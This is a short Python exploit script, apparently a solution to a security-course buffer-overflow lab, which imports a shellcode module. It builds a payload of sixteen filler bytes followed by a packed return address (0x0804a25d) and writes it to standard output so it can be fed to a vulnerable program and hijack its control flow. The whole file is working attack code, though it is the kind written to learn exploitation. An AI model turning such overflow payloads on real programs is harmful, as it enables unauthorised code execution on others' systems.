import sys
from struct import pack
from shellcode import shellcode

# Implement your attack here!
payload = b'A' * 16
address = pack('<I', 0x0804a25d)
payload += address
# Launch the attack!
sys.stdout.buffer.write(payload)
